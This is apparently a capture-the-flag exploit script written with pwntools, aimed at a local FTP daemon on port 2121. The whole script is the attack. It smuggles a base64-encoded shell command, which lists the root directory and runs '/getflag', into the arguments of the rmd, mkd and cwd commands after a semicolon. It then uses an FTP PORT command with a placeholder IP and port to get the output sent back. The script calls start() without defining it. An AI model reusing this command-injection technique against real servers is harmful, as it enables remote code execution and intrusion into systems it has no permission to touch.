from pwn import *
context.log_level = 'debug'

TARGET = './ftpd'
HOST = 'localhost'
PORT =  2121

r = start()
raw_cmd = b'ls -la /;/getflag'
cmd = f'echo {b64e(raw_cmd)}|base64 -d|sh'

r.sendline(b'noop')
r.sendlineafter(b'200 OK\r\n', f'rmd a;{cmd}'.encode())
r.sendline(b'noop')
r.sendlineafter(b'200 OK\r\n', f'mkd a;{cmd}'.encode())
r.sendlineafter(b'created\r\n', f'cwd a;{cmd}'.encode())
r.sendlineafter(b'ful\r\n', b'port xx,xx,xx,xx,pp,pp') # FIXME: edit (ip, port) to get result
r.sendlineafter(b'\r\n', b'list')

r.interactive()
r.close()

